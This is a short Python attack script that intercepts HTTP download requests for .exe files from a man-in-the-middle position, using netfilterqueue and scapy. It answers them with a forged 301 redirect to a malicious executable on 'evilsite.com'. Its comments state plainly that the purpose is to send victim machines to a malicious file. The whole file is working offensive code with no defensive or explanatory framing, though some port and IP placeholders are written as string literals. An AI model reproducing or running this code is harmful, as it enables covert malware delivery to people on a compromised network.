# Author: Mystik Developed
#
# Date: 12/28/2019 
#
# Program: Mystik Developed dl_intercept.py
#
# Language: Python
#
# Functionality: This python script is used to
# intercept HTTP requests for downloads and
# redirect victim machine to malicious file. 
#
# Requires being MITM across network
#
#!/usr/bin/env python

#requirements 
import netfilterqueue
import scapy.all as scapy

ack_list = []
print("Intercept listening...")
# Clean up the intercepted packet before
# sending on to target
def set_load(packet, load):
  packet[scapy.Raw].load = load
  del packet[scapy.IP].len
  del packet[scapy.IP].chksum
  del packet[scapy.TCP].chksum
  return packet

# Read packet data for file type extensions in 
# raw load - WIP to add for other popular doc types
# if file type is found in load, check ack list
# for seq - if found, replace dl and remove from ack list
def process_packet(packet):
  scapy_packet = scapy.IP(packet.get_payload())
  if scapy_packet.haslayer(scapy.Raw):
    if scapy_packet[scapy.TCP].dport == "iptables port":
      if ".exe" in scapy_packet[scapy.Raw].load and "kali ip" not in scapy_packet[scapy.Raw].load:
        print("[+] EXE request")
        ack_list.append(scapy_packet[scapy.TCP].ack)
    elif scapy_packet[scapy.TCP].sport == "iptables port":
      if scapy_packet[scapy.TCP].seq in ack_list:
        ack_list.remove(scapy_packet[scapy.TCP].seq)
        print("[+] Replacing file...")
        modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://www.evilsite.com/evil.exe")
        
        packet.set_payload(str(modified_packet))

  #accept the packet
  packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
